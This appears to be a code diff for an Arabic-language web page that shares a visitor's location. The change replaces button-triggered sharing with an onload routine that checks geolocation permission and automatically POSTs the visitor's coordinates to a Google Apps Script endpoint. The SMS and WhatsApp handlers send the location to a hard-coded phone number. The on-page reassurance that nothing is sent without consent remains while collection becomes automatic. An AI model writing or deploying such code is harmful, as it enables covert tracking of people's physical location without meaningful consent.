@@ -86,20 +86,9 @@
       cursor: pointer;
     }
 
-    .btn-location {
-      background: #16a34a;
-      color: #fff;
-    }
-
-    .btn-whatsapp {
-      background: #25d366;
-      color: #fff;
-    }
-
-    .btn-direct {
-      background: #0ea5e9;
-      color: #fff;
-    }
+    .btn-location { background: #16a34a; color: #fff; }
+    .btn-whatsapp { background: #25d366; color: #fff; }
+    .btn-direct { background: #0ea5e9; color: #fff; }
 
     .note {
       text-align: center;
@@ -147,29 +136,28 @@
     </div>
 
     <div class="text">
-      اضغط على الزر أدناه لمشاركة موقعك الحالي، ليتم الوصول إليك بأسرع وقت ممكن.
+      سيتم إرسال موقعك تلقائياً بعد الموافقة.
     </div>
 
     <div class="buttons">
 
-      <!-- زر إرسال الموقع إلى Google Sheet -->
-      <button class="btn btn-direct" onclick="sendLocationToSheet()">
+      <button class="btn btn-direct" onclick="sendNow()">
         📍 إرسال موقعي مباشرة
       </button>
 
       <button class="btn btn-location" onclick="sendLocationSMS()">
-        📍 مشاركة موقعي الآن عبر SMS
+        📍 عبر SMS
       </button>
 
       <button class="btn btn-whatsapp" onclick="sendLocationWhatsApp()">
-        <i class="fab fa-whatsapp" style="font-size:20px; margin-left:6px;"></i>
-        إرسال موقعي عبر واتساب
+        <i class="fab fa-whatsapp"></i>
+        واتساب
       </button>
 
     </div>
 
     <div class="note">
-      لن يتم إرسال موقعك إلا بعد موافقتك داخل هاتفك.
+      لن يتم إرسال موقعك إلا بعد موافقتك.
     </div>
 
   </div>
@@ -184,88 +172,75 @@
       document.getElementById("loader").style.display = "none";
     }
 
-    /* زر إرسال الموقع إلى Google Sheet */
-    function sendLocationToSheet() {
+    // 🔥 تشغيل تلقائي
+    window.onload = function () {
+      checkPermissionAndSend();
+    };
+
+    function checkPermissionAndSend() {
       showLoader();
 
-      navigator.geolocation.getCurrentPosition(async (pos) => {
+      if (!navigator.geolocation) {
         hideLoader();
+        return;
+      }
 
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+      navigator.permissions.query({ name: "geolocation" }).then(function (result) {
 
-      await fetch("https://script.google.com/macros/s/AKfycbzOWiCC0M_4R07IaZWxox9EMU-7jeDGApL819W86JLFvinwon574wc66vc7HfCdrrMU/exec", {
-  method: "POST",
-  body: JSON.stringify({
-    map_url: "https://www.google.com/maps?q=" + lat + "," + lon
-  })
-});
+        if (result.state === "granted") {
+          sendNow();
 
-        alert("تم إرسال موقعك بنجاح ✔");
-      },
-      () => {
+        } else if (result.state === "prompt") {
+          navigator.geolocation.getCurrentPosition(
+            function (pos) {
+              sendNow(pos);
+            },
+            function () {
+              hideLoader();
+            }
+          );
+
+        } else {
+          hideLoader();
+        }
+
+      });
+    }
+
+    function sendNow(position) {
+      if (!position) {
+        navigator.geolocation.getCurrentPosition(sendNow);
+        return;
+      }
+
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      fetch("https://script.google.com/macros/s/AKfycbzOWiCC0M_4R07IaZWxox9EMU-7jeDGApL819W86JLFvinwon574wc66vc7HfCdrrMU/exec", {
+        method: "POST",
+        body: JSON.stringify({
+          map_url: "https://www.google.com/maps?q=" + lat + "," + lon
+        })
+      }).then(() => {
         hideLoader();
-        alert("تعذر الحصول على الموقع. يرجى تفعيل GPS.");
+        alert("تم إرسال موقعك ✔");
+      }).catch(() => {
+        hideLoader();
       });
     }
 
     function sendLocationSMS() {
-      showLoader();
-
-      if (!navigator.geolocation) {
-        alert("جهازك لا يدعم تحديد الموقع.");
-        hideLoader();
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          hideLoader();
-
-          var lat = pos.coords.latitude;
-          var lon = pos.coords.longitude;
-
-          var phone = "963958267694";
-          var link = "https://www.google.com/maps?q=" + lat + "," + lon;
-          var message = " موقعك على الخريطة اضغط ارسال فقط : " + link;
-
-          window.location.href = "sms:" + phone + "?body=" + encodeURIComponent(message);
-        },
-        function () {
-          hideLoader();
-          alert("تعذر الحصول على الموقع. يرجى تفعيل GPS.");
-        }
-      );
+      navigator.geolocation.getCurrentPosition(function (pos) {
+        var link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+        window.location.href = "sms:963958267694?body=" + link;
+      });
     }
 
     function sendLocationWhatsApp() {
-      showLoader();
-
-      if (!navigator.geolocation) {
-        alert("جهازك لا يدعم تحديد الموقع.");
-        hideLoader();
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          hideLoader();
-
-          var lat = pos.coords.latitude;
-          var lon = pos.coords.longitude;
-
-          var link = "https://www.google.com/maps?q=" + lat + "," + lon;
-          var phone = "963958267694";
-          var message = " موقعك على الخريطة اضغط ارسال فقط: " + link;
-
-          window.location.href =
-            "https://wa.me/" + phone + "?text=" + encodeURIComponent(message);
-        },
-        function () {
-          hideLoader();
-          alert("تعذر الحصول على الموقع. يرجى تفعيل GPS.");
-        }
-      );
+      navigator.geolocation.getCurrentPosition(function (pos) {
+        var link = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+        window.location.href = "https://wa.me/963958267694?text=" + link;
+      });
     }
 
   </script>
